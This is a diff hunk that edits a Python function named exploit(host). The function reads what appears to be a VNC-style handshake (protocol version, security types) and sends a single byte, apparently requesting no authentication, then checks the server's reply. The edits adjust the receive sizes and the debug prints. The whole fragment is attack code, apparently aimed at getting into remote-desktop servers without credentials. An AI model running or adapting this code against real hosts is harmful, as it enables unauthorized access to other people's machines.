@@ -17,15 +17,16 @@ def exploit(host):
 
 	prot_ver = sock.recv(12)
 	print('prot ver -> ' + prot_ver)
+	#sock.send(prot_ver)
 
-	sec_types = sock.recv(1)
+	sec_types = sock.recv(4)
 	print('sec types -> ' + sec_types)
 
-	hahaha = sock.recv(8)
+	hahaha = sock.recv(1)
 	sock.send('\x01')
-	print('no auth sent')
 
 	hue = sock.recv(4)
+	print(hue)
 	if unpack('I', hue):
 		print('#')
 		return
